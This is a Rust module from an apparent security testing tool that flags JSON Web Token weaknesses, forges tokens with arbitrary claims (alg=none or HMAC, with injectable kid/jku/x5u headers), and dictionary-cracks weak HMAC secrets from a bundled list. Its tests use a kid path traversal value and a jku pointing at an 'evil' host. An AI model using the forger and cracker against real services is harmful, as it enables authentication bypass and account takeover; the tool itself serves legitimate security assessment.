//! JSON Web Token analysis: decode + flag, forge, and dictionary-crack HS* tokens.

use hmac::{Hmac, Mac};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Sha256, Sha384, Sha512};

use crate::web::{b64url_decode, b64url_encode, Finding};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtParse {
    pub header: Value,
    pub claims: Value,
    pub alg: String,
    pub findings: Vec<Finding>,
}

/// Decode a JWT's header + claims and lift the classic weaknesses into findings.
/// Does NOT verify the signature (parsing is provider-agnostic recon).
pub fn parse(token: &str) -> Result<JwtParse, String> {
    let parts: Vec<&str> = token.trim().split('.').collect();
    if parts.len() < 2 {
        return Err("not a JWT (need at least header.claims)".into());
    }
    let header: Value = serde_json::from_slice(&b64url_decode(parts[0])?).map_err(|e| format!("header json: {e}"))?;
    let claims: Value = serde_json::from_slice(&b64url_decode(parts[1])?).map_err(|e| format!("claims json: {e}"))?;
    let alg = header.get("alg").and_then(Value::as_str).unwrap_or("").to_string();
    let mut findings = Vec::new();

    if alg.eq_ignore_ascii_case("none") {
        findings.push(Finding::new("critical", "alg_none", "alg=none: the signature is not verified — forge arbitrary claims (jwt_forge alg=none)."));
    }
    if header.get("jku").is_some() {
        findings.push(Finding::new("high", "jku_header", "`jku` header lets the verifier fetch the key from a URL — point it at an attacker-controlled JWKS."));
    }
    if header.get("x5u").is_some() {
        findings.push(Finding::new("high", "x5u_header", "`x5u` header points to an X.509 cert URL — attacker-controlled key injection."));
    }
    if let Some(kid) = header.get("kid").and_then(Value::as_str) {
        findings.push(Finding::new("low", "kid_header", format!("`kid` header present ({kid}) — test for path traversal / SQL injection in the key lookup.")));
    }
    if claims.get("exp").is_none() {
        findings.push(Finding::new("medium", "no_exp", "No `exp` claim: the token never expires."));
    }
    if alg.to_uppercase().starts_with("HS") {
        findings.push(Finding::new("info", "hs_alg", "HS* (HMAC) signing — crackable if the secret is weak (jwt_crack), and exposed to RS→HS key confusion if the server also accepts RS*."));
    }

    Ok(JwtParse { header, claims, alg, findings })
}

fn hs256(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut m = Hmac::<Sha256>::new_from_slice(key).expect("hmac accepts any key length");
    m.update(msg);
    m.finalize().into_bytes().to_vec()
}
fn hs384(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut m = Hmac::<Sha384>::new_from_slice(key).expect("hmac accepts any key length");
    m.update(msg);
    m.finalize().into_bytes().to_vec()
}
fn hs512(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut m = Hmac::<Sha512>::new_from_slice(key).expect("hmac accepts any key length");
    m.update(msg);
    m.finalize().into_bytes().to_vec()
}

/// Forge a token with arbitrary claims. `alg` in {none, HS256, HS384, HS512}
/// (asymmetric forging needs a key, out of scope for the pure analyzer).
/// `header_json`, if given, is merged over the default `{alg, typ:"JWT"}` so you
/// can inject `kid`/`jku`/`x5u` for the key-injection tests.
pub fn forge(claims_json: &str, alg: &str, secret: &str, header_json: Option<&str>) -> Result<String, String> {
    let claims: Value = serde_json::from_str(claims_json).map_err(|e| format!("claims json: {e}"))?;
    let mut header = serde_json::json!({ "alg": alg, "typ": "JWT" });
    if let Some(hj) = header_json {
        let extra: Value = serde_json::from_str(hj).map_err(|e| format!("header json: {e}"))?;
        if let (Some(h), Some(e)) = (header.as_object_mut(), extra.as_object()) {
            for (k, v) in e {
                h.insert(k.clone(), v.clone());
            }
        }
    }
    let signing_input = format!("{}.{}", b64url_encode(header.to_string().as_bytes()), b64url_encode(claims.to_string().as_bytes()));
    let sig = match alg.to_uppercase().as_str() {
        "NONE" => String::new(),
        "HS256" => b64url_encode(&hs256(secret.as_bytes(), signing_input.as_bytes())),
        "HS384" => b64url_encode(&hs384(secret.as_bytes(), signing_input.as_bytes())),
        "HS512" => b64url_encode(&hs512(secret.as_bytes(), signing_input.as_bytes())),
        other => return Err(format!("unsupported alg for forge: {other} (none/HS256/HS384/HS512)")),
    };
    Ok(format!("{signing_input}.{sig}"))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrackResult {
    pub cracked: bool,
    pub secret: Option<String>,
    pub tried: usize,
    pub alg: String,
}

/// A small bundled weak-secret list (the upstream default). Extend via the
/// `wordlist` argument.
pub fn default_wordlist() -> Vec<String> {
    [
        "secret", "password", "123456", "changeme", "admin", "key", "jwt", "token",
        "your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t", "test",
        "qwerty", "letmein", "root", "default", "private", "mysecret", "jwtsecret",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Dictionary-attack an HS* JWT's HMAC secret. Empty `wordlist` uses the bundled
/// weak list. Returns the recovered secret if any candidate reproduces the sig.
pub fn crack(token: &str, wordlist: &[String]) -> Result<CrackResult, String> {
    let parts: Vec<&str> = token.trim().split('.').collect();
    if parts.len() != 3 {
        return Err("jwt_crack needs a full 3-part token".into());
    }
    let header: Value = serde_json::from_slice(&b64url_decode(parts[0])?).map_err(|e| format!("header json: {e}"))?;
    let alg = header.get("alg").and_then(Value::as_str).unwrap_or("").to_uppercase();
    let signer: fn(&[u8], &[u8]) -> Vec<u8> = match alg.as_str() {
        "HS256" => hs256,
        "HS384" => hs384,
        "HS512" => hs512,
        other => return Err(format!("jwt_crack only supports HS* algs, got `{other}`")),
    };
    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let want = b64url_decode(parts[2])?;

    let default = default_wordlist();
    let list = if wordlist.is_empty() { &default[..] } else { wordlist };
    let mut tried = 0;
    for w in list {
        tried += 1;
        if signer(w.as_bytes(), signing_input.as_bytes()) == want {
            return Ok(CrackResult { cracked: true, secret: Some(w.clone()), tried, alg });
        }
    }
    Ok(CrackResult { cracked: false, secret: None, tried, alg })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_flags_alg_none_and_missing_exp() {
        // {"alg":"none","typ":"JWT"} . {"user":"admin"}
        let token = format!(
            "{}.{}.",
            crate::web::b64url_encode(br#"{"alg":"none","typ":"JWT"}"#),
            crate::web::b64url_encode(br#"{"user":"admin"}"#)
        );
        let p = parse(&token).unwrap();
        assert_eq!(p.alg, "none");
        assert_eq!(p.claims["user"], "admin");
        assert!(p.findings.iter().any(|f| f.id == "alg_none" && f.severity == "critical"));
        assert!(p.findings.iter().any(|f| f.id == "no_exp"));
    }

    #[test]
    fn parse_flags_jku_and_kid_header_injection() {
        let token = format!(
            "{}.{}.",
            crate::web::b64url_encode(br#"{"alg":"HS256","kid":"../../dev/null","jku":"https://evil/jwks"}"#),
            crate::web::b64url_encode(br#"{"sub":"1","exp":9999999999}"#)
        );
        let p = parse(&token).unwrap();
        assert!(p.findings.iter().any(|f| f.id == "jku_header" && f.severity == "high"));
        assert!(p.findings.iter().any(|f| f.id == "kid_header"));
        assert!(p.findings.iter().any(|f| f.id == "hs_alg"));
        assert!(!p.findings.iter().any(|f| f.id == "no_exp"), "exp present");
    }

    #[test]
    fn forge_then_crack_recovers_the_secret() {
        let token = forge(r#"{"user":"admin","role":"root"}"#, "HS256", "changeme", None).unwrap();
        // A forged HS256 token parses cleanly and round-trips through the cracker.
        let p = parse(&token).unwrap();
        assert_eq!(p.alg, "HS256");
        assert_eq!(p.claims["role"], "root");

        let r = crack(&token, &[]).unwrap();
        assert!(r.cracked);
        assert_eq!(r.secret.as_deref(), Some("changeme"));
    }

    #[test]
    fn crack_reports_failure_on_a_strong_secret() {
        let token = forge(r#"{"a":1}"#, "HS256", "a-very-strong-unguessable-secret-9f3", None).unwrap();
        let r = crack(&token, &[]).unwrap();
        assert!(!r.cracked);
        assert!(r.secret.is_none());
        assert!(r.tried > 0);
    }

    #[test]
    fn forge_alg_none_has_empty_signature() {
        let token = forge(r#"{"admin":true}"#, "none", "", None).unwrap();
        assert!(token.ends_with('.'), "alg=none → empty signature segment");
        assert!(crack(&token, &[]).is_err(), "cracking a none token is meaningless");
    }

    #[test]
    fn forge_injects_custom_header_fields() {
        let token = forge(r#"{"a":1}"#, "HS256", "k", Some(r#"{"kid":"evil"}"#)).unwrap();
        let p = parse(&token).unwrap();
        assert_eq!(p.header["kid"], "evil");
    }
}
